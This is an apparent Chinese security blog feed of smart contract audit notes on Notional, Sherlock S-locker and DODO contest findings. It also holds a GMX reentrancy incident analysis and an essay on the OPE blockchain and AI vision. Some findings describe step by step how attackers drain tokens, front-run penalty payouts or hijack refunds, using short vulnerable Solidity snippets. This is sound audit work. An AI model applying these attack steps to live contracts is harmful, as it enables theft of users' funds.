    <entry>
      <title>Notional Exponent 审计</title>
      <link href="/2025/07/28/Notional-Exponent-%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A/"/>
      <url>/2025/07/28/Notional-Exponent-%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="Notional-Exponent审计报告"><a href="#Notional-Exponent审计报告" class="headerlink" title="Notional Exponent审计报告"></a>Notional Exponent审计报告</h1><h2 id="迁移pool池的功能，把迁移数设置为了不可变量"><a href="#迁移pool池的功能，把迁移数设置为了不可变量" class="headerlink" title="迁移pool池的功能，把迁移数设置为了不可变量"></a>迁移pool池的功能，把迁移数设置为了不可变量</h2><p>当 <code>Convex </code>的某个奖励池被废弃（例如旧的 <code>pid </code>失效），并为同一个<code>LP token</code>分配了新的 <code>pid</code> 时，升级管理员可以执行“迁移”操作，将流动性从旧 <code>pid</code> 提取，再存入新的 <code>pid</code>。</p><p>但是，策略合约中记录的 <code>pid</code> 是不可变（<code>immutable</code>）的。这意味着策略合约本身仍会引用旧的 <code>pid</code> 和旧的奖励池（即旧的<code> yieldToken</code>），即使底层资产已经迁移到了新的奖励池。结果是：策略的内部状态与 <code>Convex</code> 实际奖励池状态不一致，功能失效。</p><h2 id="迁移资金时，没有注意还有其他的资金在另外一个地方"><a href="#迁移资金时，没有注意还有其他的资金在另外一个地方" class="headerlink" title="迁移资金时，没有注意还有其他的资金在另外一个地方"></a>迁移资金时，没有注意还有其他的资金在另外一个地方</h2><blockquote><p>这个要根据分析迁移时的资金转移来看，必须得深入每一个调用链的关系.分析资金的走向</p></blockquote><p><code>AbstractRewardManager::migrateRewardPool</code> 函数允许管理员将当前奖励池迁移至一个新的奖励池。</p><p>在迁移过程中，合约会尝试先领取旧奖励池的奖励，然后再将资产转入新奖励池。但在调用链深入分析后发现，这个流程 忽略了 <code>Convex</code> 中“奖励暂存合约（<code>stash</code>）”中的奖励领取机制，导致部分奖励在迁移中丢失。</p><h2 id="错误的计算，通过一种资产计算另一种资产"><a href="#错误的计算，通过一种资产计算另一种资产" class="headerlink" title="错误的计算，通过一种资产计算另一种资产"></a>错误的计算，通过一种资产计算另一种资产</h2><p>计算逻辑：</p><p>PT → 可换 SY（看得见）</p><p>SY ≠ Yield Token（预言机误认为是）</p><p>所以：PT价格 &#x3D; SY数量 × YieldToken价格 → ❌ 高估</p><p>→ 抵押被高估 → 超额借款 → 爆仓风险上升</p><h2 id="没有在支持的链上实现特定的功能"><a href="#没有在支持的链上实现特定的功能" class="headerlink" title="没有在支持的链上实现特定的功能"></a>没有在支持的链上实现特定的功能</h2><p>该项目在以太坊主网上实现了撤回资金的功能，但是并没有在侧链上实现，导致功能的受损</p>]]></content>
      
      
      
        <tags>
            
            <tag> 审计报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GMX协议遭受重入攻击损失4200万美美金</title>
      <link href="/2025/07/11/GMX%E5%8D%8F%E8%AE%AE%E9%81%AD%E5%8F%97%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB%E6%8D%9F%E5%A4%B14200%E4%B8%87%E7%BE%8E%E7%BE%8E%E9%87%91/"/>
      <url>/2025/07/11/GMX%E5%8D%8F%E8%AE%AE%E9%81%AD%E5%8F%97%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB%E6%8D%9F%E5%A4%B14200%E4%B8%87%E7%BE%8E%E7%BE%8E%E9%87%91/</url>
      
        <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>在2025年7月9号，也就是前不久，GMX协议在Arbitrum上遭黑客攻击，攻击的主要问题集中在 <strong>重入+share price 操控</strong></p><blockquote><p>常见的攻击模式：在 <code>deposit/mint</code> 中重入，通过再次 <code>deposit</code>或者 <code>donate</code> 的形式，操控 <code>share price</code> 导致 <code>withdraw/redeem</code> 的时候 <code>share</code> 价格相对于 <code>deposit/mint</code> 过程发生变化。从而实现立马获取收益</p></blockquote><p>在这个合约中，并不是这样简单的重入（如果这样，早就被盗窃完了），仔细看代码，其实是 <code>GMX</code> 协议本身依赖外部合约进行重入保护，但是外部合约对用户地址存在 <code>callback</code>，且没有使用安全的<code>callback</code> 形式，导致用户绕过了外部的重入开关后，直接对 <code>share price</code> 价格进行操控。从而获利。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 攻击事件分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于OPE</title>
      <link href="/2025/06/19/%E5%85%B3%E4%BA%8EOPE/"/>
      <url>/2025/06/19/%E5%85%B3%E4%BA%8EOPE/</url>
      
        <content type="html"><![CDATA[<h1 id="OPE-讴谱"><a href="#OPE-讴谱" class="headerlink" title="OPE 讴谱"></a>OPE 讴谱</h1><h2 id="讴谱目标：O-P-E"><a href="#讴谱目标：O-P-E" class="headerlink" title="讴谱目标：O-P-E"></a>讴谱目标：O-P-E</h2><p><strong>O:</strong> Optimization-优化</p><ul><li>优化一个新体系<br><strong>p:</strong> Purification-净化</li><li>除去恶方面<br><strong>E:</strong> Evolution-进化</li><li>提升和扩大体系功能</li></ul><h2 id="五共思想"><a href="#五共思想" class="headerlink" title="五共思想"></a>五共思想</h2><p><strong>共识</strong>：学区块链的第一步就是了解比特币以太坊，比特币的共识是<code>POW</code>，由于少数人可以控制节点权力，到以太坊所使用的共识就改进为<code>POS</code>，而我现在正在研究<code>Solana</code>的底层协议，它又是采用<code>POH</code>共识，通过历史时间证明，加快了交易的执行，是性能的优化。所以共识就是在不断发展，不断优化，符合大部分人的利益所认同的所接受的。<code>OPE</code>中提供就是按贡献分配这个共识，我就觉得有点和比特币<code>POW</code>有点相似，你做有效事的越多，你就收获的越多。</p><p><strong>共创</strong>：打破垄断，一起创作，合作。在<code>OPE</code>世界中，是优缺互补，一起发挥各自的价值做好一件事</p><p><strong>共生</strong>：我感觉就是没有竞争，互惠共利，比如现在的外卖大战，以前的购物平台纷纷宣布投入外卖市场，各家都拿出最大的优惠来竞争，如果各家都能拿出自己的资源，共同友好发展，就能实现利益最大化，不就是达到了一个共生的理念。</p><p><strong>共治</strong>：现在社会都是上级传达命令，我们需要去服从命令，在<code>OPE</code>中的逻辑强调的事议定和评调</p><ul><li>议定：所有人一起讨论参与制定规则，不是有某个中心化权力高的组织制定的</li><li>评调：虽然你是所有人都参与制定了规则，但不是立马就是落地执行的，也要保证符合当今社会的发展</li></ul><p>现在区块链的<code>DAO</code>,是通过拥有投票权的社区成员来进行投票的决策的，实际上还是没有达成所有人制定规则，而且很容易形成寡头治理，<code>OPE</code>提出的共治，我觉得是很好的一个想法，考虑人人有权力,人人都参与，也确保了决策符合现实社会。</p><p><strong>共享</strong>：我在<code>YouTub</code>看完这个五共思想后，第一反应就是共产主义的共同富裕，资源人人贡献，在中国之前有个生产合作社的时代，是我外婆那个年代，也是共享的思想，资源都拿出来，大家一起共享，工作也是大家一起，可是总有一些懒汉存在，偷懒耍滑也能共享大家的资源。而<code>OPE</code>中共享，有讯传，态现俩关键字</p><ul><li>讯传：保证信息在各主体中，公开实时的传递</li><li>态现：状态与操作过程中，清晰展示，反应系统的运行</li></ul><p>对于<code>OPE</code>中的共享，强调了消息的实时公开，避免了消息的阻塞与关键消息只掌握到少数人的手中，更是实现了区块链的一大特点，公开透明。</p><h2 id="M-STVB"><a href="#M-STVB" class="headerlink" title="M-STVB"></a>M-STVB</h2><p>**M:**MetaValue(元阀)<br>元神，下面详细介绍<br>**S:**Security(安全)<br>我目前也在做智能合约的审计，包括<code>solidity</code>,<code>rust</code>的智能合约（defi领域），看过很多因为代码的漏洞（如：重入，溢出，权限丢失，抢跑攻击，女巫攻击等基础漏洞），而损失上亿资产的事件，目前来说这些都只关注了合约安全，资产安全，而<code>OPE</code>中的安全不仅是强调资产安全，还包括个体组织安全，生命的安全，组织运行的安全，是更广泛的提出了在<code>web3</code>下<code>OPE</code>中的安全定义.<br>**T:**Trust(可信)<br>在<code>OPE</code>中,信任不是你信任我，我信任你就行了，而是一种对于个体组织可信度的评估，它分为：绝对信用等级，相对信用值</p><ul><li>绝对信用等级：用来评估一个整体的可信度，就比如你去银行借钱，银行是不是要看你的征信，来评估要不要贷款给你</li><li>相对信用值：在某种特定的情况下，你拥有一定的可信值，比如，你是国家的公职人员或者公司大老板，那么你去银行借钱是不是就比普通人借钱更有可信度（我个人认为）<br>**V:**Value(价值)<br>价值，指贡献所带来的价值，它所包括的是价值的流动，价值的分配，价值的分配和价值的布获，理解的就是个体和组织贡献出来的价值<br>**B:**Benevolent(向善)<br>向善，字面意思很好理解，就是面向善的方向，现在ai机器人很火爆，包括春晚也有机器人出现，有人就会担心怕它们有自己的思想，危害人类。而在<code>OPE</code>系统中，要植入法律法规伦理道德。让元神做思考时，有个基本准则，这就是向善发展，也是目前<code>web3</code>没有的，现在的<code>web3</code>太多炒币和项目，分不清哪个才是有益，没有向善的标准。</li></ul><h2 id="元神"><a href="#元神" class="headerlink" title="元神"></a>元神</h2><p>元神是<code>OPE</code>体系中基本单位，我们所知道的<code>web2</code>是有平台账户管理，<code>web3</code>则是去账户权力掌握在自己的手中，在<code>OPE</code>中不需要账户，钱包哪些，每个人都有一个元神代表自己，给我感觉更像使用ai创造出来一个虚拟体也是一个智能体，也好像那种二次元虚拟人物。元神这个概念让我联想到了区块链的<code>NFT</code>和<code>DID</code>，<code>NFT</code>可以使用一个非同质化代币来代表自己的特定身份，只不过交易还是由用户发起，并不是由<code>NFT</code>。<code>DID</code>也是用户拥有的唯一的数字身份标识，类似于通行证。<code>OPE</code>中的元神，就可以完全代表用户进行活动治理等。困难就是如何证明这个元神属于你，<code>DID</code>和<code>NTF</code>都有唯一的编号来识别，这让我想到之前做过的项目（学生身份系统识别），使用零知识证明，<code>zk技术</code>会不会可以运用到创建元神智能体中。</p><h2 id="区块链-AI下的讴谱文明"><a href="#区块链-AI下的讴谱文明" class="headerlink" title="区块链+AI下的讴谱文明"></a>区块链+AI下的讴谱文明</h2><p>讴谱就是在现在的web3下的一个新体系，是一个完全去中心化的体系</p><p><strong>区块链对构建讴谱文明的作用</strong></p><p>已经系统学习区块链俩年了，最开始我和别人介绍的区块链就一句话：区块链是一个分布式记账的账本。从而可见，区块链的特点：<strong>去中性化</strong>，<strong>不可篡改</strong>，<strong>公开透明</strong>，而我们的讴谱体系就是基于区块链特性。可以借鉴区块链<code>MPT</code>的状态存储，区块链接，区块链的加密技术，<code>P2P</code>网络以及一些可用的共识算法。现在主流的公链治理机制也是可以学习的。区块链就是提供了一个搭建去中心化体系的技术。</p><ul><li><p><code>P2P</code> 网络与节点自治：借鉴区块链的对等网络设计，讴谱体系可实现节点间无中心服务器的直接通信，每个参与者既是数据使用者也是维护者，避免单点故障与集权控制。例如，以太坊的 <code>P2P</code> 网络中节点通过 <code>Gossip</code> 协议同步区块，那么讴谱也是可基于此构建分布式协作网络，确保体系内信息传输的抗审查性。</p></li><li><p>MPT 树与状态存储优化：我最近也在实现以太坊机制原理的一个区块链，它其中的默克尔 <code>Patricia 树（MPT）</code>可将账户状态、交易数据等生成加密哈希值，来构建一个树出来，确保数据的完整性与可追溯性。那么讴谱体系是不是可采用类似结构存储体系内元神的身份、权益、贡献等状态，比如用 <code>MPT</code> 记录每个元神的贡献值与权益凭证，实现 “数据不可篡改 + 高效验证”。</p></li><li><p>区块链的<code>DAO</code>：如果讴谱是实现所有人的参与决策（共治），那么完全去中化就会出现一个效率低下的问题，如果我们学习区块链中的<code>DAO</code>社区选举代表去进行决策，会不会提升效率。大概意思是分成小组确保每个人参与决策，但是随后我想到会有一个问题:小组每个决策不一样怎么办。这个时候进行少数服从多数。</p></li><li><p>zk技术：讴谱文明体系中元神是基本的单位，也就是说每个人都有自己的一个智能体，如何在不公开自己的身份情况下，告诉其他人这个智能体就代表我，我觉得可以采用一下zk技术，或者是学习这种的思想去包装元神概念，提高隐私保护性。讴谱文明中还是的考虑隐私保护问题。</p></li></ul><p>讴谱文明体系是基于区块链特性而生，所以在无论是对现有的区块链产品进行一个方案优化，或者是核心算法的改进，是不是就可以运用到构建讴谱文明中。</p><p><strong>人工智能对构建讴谱文明的作用</strong></p><p>人工智能对于构建讴谱文明的作用是显而易见的。可以借用人工智能对数据强大的处理能力来进行构建讴谱文明。</p><ul><li><p>正义的判官：虽然我是学区块链的，之前做过有关ai大模型的项目，但都是借用ChatGTP模型，给ai提供大量的数据，类似于给ai模型制定了一套规则。那么我们是不是在构建讴谱文明<strong>向善</strong>的时候，也训练一个ai模型出来，让它遵守法律法规伦理道德，可以充当讴谱体系中的正义判官，比如说所有人制定一个决策出来了，根据五共思想中的“共治”，还要再判断该决策是不是符合当今社会理念的，这个时候是不是就可以需要一个ai大模型–正义的判官，推动决策的落地或者撤回。</p></li><li><p>智能体：在讴谱文明中元神这个概念很重要，借用人工智能技术可以构架一个虚拟的人物–元神，来代表每个用户。</p></li><li><p>AI分析：在讴谱stvb中，信任有俩方面，其中一个是相对信任值：在特定情况下，你拥有一定的可信值，那么这个可信值的判断是不是可以通过Ai自动分析你的贡献程度来判断你拥有多少的可信值。除此之外，使用AI智能分析，也可以具有提前预测的功能。在讴谱共识中，通过贡献度分配，我再想通过Ai智能分析，可不可优化分配算法。</p></li></ul><p>区块链+人工智能的应用目前市场上也存在，它们对构建一个新体系讴谱文明缺一不可，如果只采用区块链的技术，那么和web3的一些体系没有什么区别，而且也达不到讴谱文明的目标，如果只采用人工智能技术，那么讴谱文明就不能实现的去中心化，达不到共治，共享的理念，和现代治理体系差不多。比如，前面所提到的我的想法：元神如何证明身份，就是采用了人工智能与区块链技术。</p><p>所以区块链+人工智能俩者相结合，才能构建一个讴谱文明体系，才能构建出一个颠覆现代的文明体系。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sherlock-S-locker System</title>
      <link href="/2025/06/17/sherlock-S-locker-System/"/>
      <url>/2025/06/17/sherlock-S-locker-System/</url>
      
        <content type="html"><![CDATA[<h1 id="sherlock-S-locker-System"><a href="#sherlock-S-locker-System" class="headerlink" title="sherlock-S-locker System"></a>sherlock-S-locker System</h1><h2 id="升级合同，常量发生改变"><a href="#升级合同，常量发生改变" class="headerlink" title="升级合同，常量发生改变"></a>升级合同，常量发生改变</h2><p>现有正式合约中的 DOWNSCALER 为 1e16，而提议升级的合约中 DOWNSCALER 为 1e18，两者不一致，导致以下影响：</p><ul><li><p>升级合约后新加入的质押者，在 <code>lockedStakedBalance</code> 相同的情况下，所获得的单位数（units）明显少于老质押者，分配收益时不公平。</p></li><li><p>升级合约后，如果已有质押者追加较少（少于100倍）的质押金额，其单位数反而会减少，获得的税收分成变少。</p></li><li><p>质押者可能会提前操作，在合约升级前抢先质押，以获得更多单位数并获取更大的税收分成。</p></li></ul><h2 id="抢跑攻击，在知晓分配收益时，扩大自己的份额，获取更多的收益"><a href="#抢跑攻击，在知晓分配收益时，扩大自己的份额，获取更多的收益" class="headerlink" title="抢跑攻击，在知晓分配收益时，扩大自己的份额，获取更多的收益"></a>抢跑攻击，在知晓分配收益时，扩大自己的份额，获取更多的收益</h2><p>在解锁获得惩罚金时，攻击者提前知道，然后通过提供流动性或者质押金额，去分配获益</p><ul><li><p>某个用户准备进行立即解锁（instant unlock）。</p></li><li><p>恶意的 Locker 拥有者在此之前增加自己的流动性或质押额度。</p></li><li><p><code>_instantUnlock</code> 被调用，惩罚金被分配给当前的 LP 和质押者。</p></li><li><p>恶意 Locker 拥有者因持有单位（units）而获得部分惩罚金收益。</p></li><li><p>获取收益后，立即撤回流动性或解除质押。</p></li></ul><p>恶意的 Locker 拥有者可以通过前置操作抢跑，临时提高自己的持仓量，从而在惩罚金分配中获利，获得不公平优势。<br>建议对 <code>FLUID.distribute</code> 逻辑进行调整或增加锁仓时间&#x2F;份额快照机制，防止抢跑获利</p><h2 id="缺金额的有效验证"><a href="#缺金额的有效验证" class="headerlink" title="缺金额的有效验证"></a>缺金额的有效验证</h2><p><code>FluidLocker::provideLiquidity</code> 函数缺少对 <code>getAvailableBalance()</code> 的校验，导致在 6 个月免税期结束后，质押代币可以被提取，但不需要调用 <code>FluidLocker::unstake</code>。这意味着质押奖励会继续累积，尽管代币已经不在合约中，造成质押奖励系统完整性的损失。</p><ul><li><p>Locker 拥有者调用 <code>FluidLocker::stake</code>，将 locker 内所有可用代币进行质押。</p></li><li><p>Locker 拥有者调用 <code>FluidLocker::provideLiquidity</code>，用这些质押代币创建 Uniswap 流动性仓位。注意此步骤会将代币转移出 locker。</p></li><li><p>6 个月后，Locker 拥有者调用 <code>FluidLocker::withdrawLiquidity</code> 触发免税提现路径。此时用于提供流动性的代币已经回到 Locker 拥有者地址，但 locker 仍认为这些代币处于质押状态。</p></li></ul><h2 id="分发金额错误，有些金额已经在之前的时段分发过了"><a href="#分发金额错误，有些金额已经在之前的时段分发过了" class="headerlink" title="分发金额错误，有些金额已经在之前的时段分发过了"></a>分发金额错误，有些金额已经在之前的时段分发过了</h2><p>当 <code>block.timestamp &gt; endDate - EARLY_PROGRAM_END</code> 时，一部分初始存入的代币<code>（initialDeposit）已在 block.timestamp - (endDate - EARLY_PROGRAM_END)</code> 这段时间内被分发。<br>但是合约却仍然发送了全部的<code> initialDeposit</code>。</p><h2 id="没有检查单位池是否有单位数"><a href="#没有检查单位池是否有单位数" class="headerlink" title="没有检查单位池是否有单位数"></a>没有检查单位池是否有单位数</h2><p>在区块链系统中，很多奖励或惩罚机制通过将代币或奖励“分发”到某个“单位池”（unit pool）来完成。但如果目标池中没有接收者（即单位数 units &#x3D;&#x3D; 0），系统仍然执行分发操作，则这些代币会 没有接收者，永久卡在合约中 或 直接被销毁</p><h2 id="分发奖励时，用户成为唯一的质押者，导致不用罚金"><a href="#分发奖励时，用户成为唯一的质押者，导致不用罚金" class="headerlink" title="分发奖励时，用户成为唯一的质押者，导致不用罚金"></a>分发奖励时，用户成为唯一的质押者，导致不用罚金</h2><p>但如果用户是唯一的质押者或流动性提供者，那么惩罚金（penalty）通过分发逻辑又返回到了用户自己的 Locker 中：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">// 向流动性提供者分发惩罚金</span><br><span class="line">FLUID.distribute(address(this), LP_DISTRIBUTION_POOL, penaltyAmount * providerAllocation / BP_DENOMINATOR);</span><br><span class="line"></span><br><span class="line">// 向质押者分发惩罚金</span><br><span class="line">FLUID.distribute(address(this), STAKER_DISTRIBUTION_POOL, penaltyAmount - actualProviderDistributionAmount);</span><br></pre></td></tr></table></figure><p>上述分发实际上又回到了当前调用的 Locker，也就是说，罚金并没有“损失”出去。<br>这意味着用户可以重复调用 instant unlock，通过多次操作，几乎免除应缴的 80% 惩罚金，只留下少量残余资金因最低解锁额度被锁在合约中（由于每次都有小额惩罚，但大部分都被返回）。</p><p>影响是：<br>用户可以绕过 80% 惩罚费用，立即取出大部分原本锁定的资金；<br>导致协议的惩罚机制失效，流动性和质押的经济模型失衡。</p><h2 id="检查条件不完整"><a href="#检查条件不完整" class="headerlink" title="检查条件不完整"></a>检查条件不完整</h2><p>你有一笔钱放进了某个平台的“保险箱”里（这个保险箱就是合约），本来要锁6个月才能取出来。</p><p>但平台说：</p><p>“如果你急着用钱，可以立即取出来，但你要交一点‘罚金’。”</p><p>这个罚金不会烧掉，而是分给两个群体的人：</p><p>有人把钱放进平台来做质押（我们叫这些人“质押者”）</p><p>有人提供了交易对来让别人兑换代币（我们叫这些人“流动性提供者”）</p><p>⚠️ 那问题来了：<br>假如项目方设置说：</p><p>“罚金全给流动性提供者（LP），不给质押者”。</p><p>于是大家一看质押没奖励，就没人再质押了！</p><p>🧨 现在你要取钱！<br>你说：“我想立刻解锁我保险箱里的钱，我愿意交罚金！”</p><p>平台合约内部运行逻辑是：</p><p>看看现在质押池（staker pool）有没有人 → 哦！没人？不行，不让你取钱！</p><p>看看流动性池（LP pool）有没有人 → 有人？那继续执行。</p><p>你是不是觉得很奇怪？</p><p>明明 项目方说了不给质押者奖励（是 0%），现在没人质押本来是正常的，但合约却说：“没人质押，不能解锁”，是不是脑子有点问题？</p><p>🧱 这就是这个漏洞！<br>合约逻辑写死了：“只要没人质押就不给解锁”，但没考虑到某些时候奖池设置为 0%，本来就不该有人质押啊！</p><p>所以你无法解锁你的资金，卡死了！</p><h2 id="俩个不同的量放在一起计算缓冲区buffer是错误的"><a href="#俩个不同的量放在一起计算缓冲区buffer是错误的" class="headerlink" title="俩个不同的量放在一起计算缓冲区buffer是错误的"></a>俩个不同的量放在一起计算缓冲区buffer是错误的</h2><p>合约有两个流：</p><ul><li>fundingFlowRate：给员工的钱</li><li>subsidyFlowRate：税、补贴之类的钱</li></ul><p>合约代码把这两个流加起来，一起算了一次 buffer：<br><code>buffer = getBufferAmountByFlowRate(fundingFlowRate + subsidyFlowRate);</code><br>但平台规则其实是：</p><p>每个流都要单独算 buffer，因为每个都得保证“不断流”。</p><p>buffer 是预留的“流动资金池”，你每开一个钱流，就要准备够它的“最低启动金”。这个漏洞就是因为错把两个钱流当成一个处理，导致算少了 buffer，启动失败。</p><h2 id="通过直接读取本地的余额，导致用户可以事先转入，绕过某些检查"><a href="#通过直接读取本地的余额，导致用户可以事先转入，绕过某些检查" class="headerlink" title="通过直接读取本地的余额，导致用户可以事先转入，绕过某些检查"></a>通过直接读取本地的余额，导致用户可以事先转入，绕过某些检查</h2><p>function provideLiquidity(uint256 supAmount) external payable nonReentrant onlyLockerOwner {<br>    uint256 ethAmount &#x3D; msg.value;  &#x2F;&#x2F; 1. 用户调用时发送的ETH数量（msg.value）</p><pre><code>_pump(weth, ethAmount * BP_PUMP_RATIO / BP_DENOMINATOR);  // 2. 调用内部函数_pump，扣除一定比例的ETH作为“承诺金”uint256 ethLPAmount = IERC20(weth).balanceOf(address(this));  // 3. 读取合约中当前WETH余额TransferHelper.safeApprove(weth, address(NONFUNGIBLE_POSITION_MANAGER), ethLPAmount);  // 4. 授权NFT管理合约花费这些WETHTransferHelper.safeApprove(address(FLUID), address(NONFUNGIBLE_POSITION_MANAGER), supAmount);  // 5. 授权FLUID代币给NFT管理合约_createPosition(ethLPAmount, supAmount);  // 6. 创建流动性头寸，使用ethLPAmount数量的WETH和supAmount数量的FLUID</code></pre><p>}</p><p>第3步，<code>ethLPAmount</code> 是读取合约当前 WETH余额，但这个余额可能包含之前用户直接转账给合约的WETH（用户绕过了调用时传ETH的限制）</p><p>用户可以先偷偷把很多WETH转给合约（绕过_pump的承诺金扣除），然后只用很少的ETH调用 <code>provideLiquidity</code> 函数</p><p>这样导致用户占用了大量流动性份额，却没有付出相应的“承诺金”，从而绕过了_pump设计的限制</p><h2 id="零头没有处理好，导致卡住合约"><a href="#零头没有处理好，导致卡住合约" class="headerlink" title="零头没有处理好，导致卡住合约"></a>零头没有处理好，导致卡住合约</h2><p>用户调用<code> provideLiquidity()</code>（提供流动性）时，合约会把用户的 ETH 和 SUP（代币）一起放到 <code>Uniswap V3</code> 池子里。</p><p>但 Uniswap 不一定能刚好用完用户所有的 SUP，可能会退回一小部分剩余的 SUP（叫做“dust”，即“零头”）。</p><ul><li><p>这部分剩余的 SUP 会退回到用户的 <code>FluidLocker</code> 合约里。</p></li><li><p>按理说，这些退回来的 SUP 是“闲置”的，用户可以选择质押（<code>stake</code>）或解锁（<code>unlock</code>）它们。</p></li><li><p>但是，在项目的初始阶段（即<code> UNLOCK_AVAILABLE == false</code>），质押和解锁功能都被关闭了，用户根本不能动这些剩余的 SUP。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 审计报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sherlock-DODO Cross-Chain DEX</title>
      <link href="/2025/06/17/sherlock-DODO-Cross-Chain-DEX/"/>
      <url>/2025/06/17/sherlock-DODO-Cross-Chain-DEX/</url>
      
        <content type="html"><![CDATA[<h1 id="sherlock-DODO-Cross-Chain-DEX"><a href="#sherlock-DODO-Cross-Chain-DEX" class="headerlink" title="sherlock-DODO Cross-Chain DEX"></a>sherlock-DODO Cross-Chain DEX</h1><h2 id="参数没有校验，用户可以伪造"><a href="#参数没有校验，用户可以伪造" class="headerlink" title="参数没有校验，用户可以伪造"></a>参数没有校验，用户可以伪造</h2><p><code>ZEVM </code>合约中的 <code>onCall()</code> 函数接收来自<code>Gateway</code>的 <code>token</code> 和 <code>amount</code>，但没有验证解码后的 <code>MixSwapParams</code> 是否与这些值一致。</p><p>具体来说：</p><ul><li><p><code>params.fromToken</code> 完全由用户传入消息决定</p></li><li><p><code>params.fromTokenAmount</code> 也是用户可控的</p></li></ul><p>因此攻击者可以：</p><p>通过桥接发送一小笔任意代币（如 <code>1 DAI</code>）</p><p>在消息中伪造一个大额的<code> swap</code> 请求，比如用合约中持有的大额<code>WZETA</code>来兑换 <code>USDC</code></p><p>实际 swap 时使用的是合约自己持有的<code> WZETA</code></p><p>攻击者获得兑换后的 <code>USDC</code>，而合约的 <code>WZETA </code>被盗</p><p>这会导致攻击者可以完全清空合约中持有的高价值代币。</p><h2 id="参数没有校验"><a href="#参数没有校验" class="headerlink" title="参数没有校验"></a>参数没有校验</h2><p>如果发生转移的是原生代币，实际上是没有校验数量是不是准确的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withdrawToNativeChain(</span><br><span class="line">    address zrc20,</span><br><span class="line">    uint256 amount,</span><br><span class="line">    bytes calldata message</span><br><span class="line">) external payable &#123;</span><br><span class="line">    if(zrc20 != _ETH_ADDRESS_) &#123;</span><br><span class="line">        require(IZRC20(zrc20).transferFrom(msg.sender, address(this), amount), &quot;INSUFFICIENT ALLOWANCE: TRANSFER FROM FAILED&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    // 🚨这里缺失了关键校验🚨</span><br><span class="line">    // require(msg.value &gt;= amount, &quot;INSUFFICIENT NATIVE TOKEN&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击者可以假装提取原生币（ETH），从而绕过代币的 <code>transferFrom </code>校验，但实际指向真实的 <code>ZRC20</code> 合约（如 <code>USDC.ZRC20</code>）来偷偷提走这些代币！</p><h2 id="地址不要设置为零"><a href="#地址不要设置为零" class="headerlink" title="地址不要设置为零"></a>地址不要设置为零</h2><p>比如代币转回的时候，接受地址不能设置为零，在看到地址为零的地方，需要查看它接受的代币是什么，如果被转到零地址，那么就会出现代币进入黑底洞</p><h2 id="攻击者获得退款信息后，可以提前构造一个相同的退款交易覆盖用户的退款"><a href="#攻击者获得退款信息后，可以提前构造一个相同的退款交易覆盖用户的退款" class="headerlink" title="攻击者获得退款信息后，可以提前构造一个相同的退款交易覆盖用户的退款"></a>攻击者获得退款信息后，可以提前构造一个相同的退款交易覆盖用户的退款</h2><p>攻击者发现，某合法用户（称为“受害者”）的跨链交易失败了，退款信息<code> refundInfo</code>[VICTIM_EXTERNAL_ID] 已经存在，里面有受害者的钱，比如 1000 个 zUSDC。</p><p>攻击者自己发起一笔跨链交易，故意设计让它失败（比如调用一个总是会 <code>revert</code> 的合约），以便触发 <code>onRevert</code>。</p><p>这笔攻击交易构造了一个恶意的 <code>RevertOptions</code>，里面的 <code>revertMessage</code> 包含了受害者的 <code>externalId</code> 和攻击者自己的钱包地址。</p><p>当这笔攻击交易触发 <code>onRevert</code> 时：</p><ul><li><p>合约拿到 <code>revertMessage</code>，用它去写 refundInfo[externalId]。</p></li><li><p>由于没有检查，直接用攻击者的地址覆盖了受害者对应的退款信息。</p></li></ul><p>这样，原本属于受害者的钱被“绑架”到了攻击者的钱包地址。</p><p>受害者尝试退款时，发现退款的钱已经不在自己的地址了，资金被攻击者劫持。</p><h2 id="验证逻辑错误"><a href="#验证逻辑错误" class="headerlink" title="验证逻辑错误"></a>验证逻辑错误</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function claimRefund(bytes32 externalId) external &#123;</span><br><span class="line">    RefundInfo storage refundInfo = refundInfos[externalId];</span><br><span class="line"></span><br><span class="line">    address receiver = msg.sender;  // 默认是调用者本人</span><br><span class="line">    if (refundInfo.walletAddress.length == 20) &#123;</span><br><span class="line">        receiver = address(uint160(bytes20(refundInfo.walletAddress)));</span><br><span class="line">    &#125;</span><br><span class="line">    require(bots[msg.sender] || msg.sender == receiver, &quot;INVALID_CALLER&quot;);</span><br><span class="line">    // 执行转账逻辑</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要if条件不满足，就会直接进入require语句，那么就会直接变为ture,任何人都可以调用</p><h2 id="USDT不允许从非零额度授权到非零额度"><a href="#USDT不允许从非零额度授权到非零额度" class="headerlink" title="USDT不允许从非零额度授权到非零额度"></a>USDT不允许从非零额度授权到非零额度</h2><p><code>USDT</code> 的 <code>approve</code> 函数设计有别于标准 <code>ERC20</code>：</p><ul><li><p>如果当前授权额度（<code>allowance</code>）大于 0，且调用方试图设置一个非零的新授权额度，<code>approve</code> 会直接失败（<code>revert</code>）。</p></li><li><p>这是 <code>USDT</code> 特殊的安全设计，避免某些风险，但与大多数 <code>ERC20</code> 标准实现不同。</p></li></ul><h2 id="区分原生代币和ERC20代币"><a href="#区分原生代币和ERC20代币" class="headerlink" title="区分原生代币和ERC20代币"></a>区分原生代币和ERC20代币</h2><p>如果一个合约中出现这实现了原生代币和erc20代币，那么就要考虑到不要混淆实现逻辑，或者忘记实现原生代币的</p><h2 id="无法兼容-USDT-等非标准-ERC20-代币"><a href="#无法兼容-USDT-等非标准-ERC20-代币" class="headerlink" title="无法兼容 USDT 等非标准 ERC20 代币"></a>无法兼容 USDT 等非标准 ERC20 代币</h2><p>协议本应支持 ZetaChain 所支持的资产代币，但在实际运行中，它无法兼容如 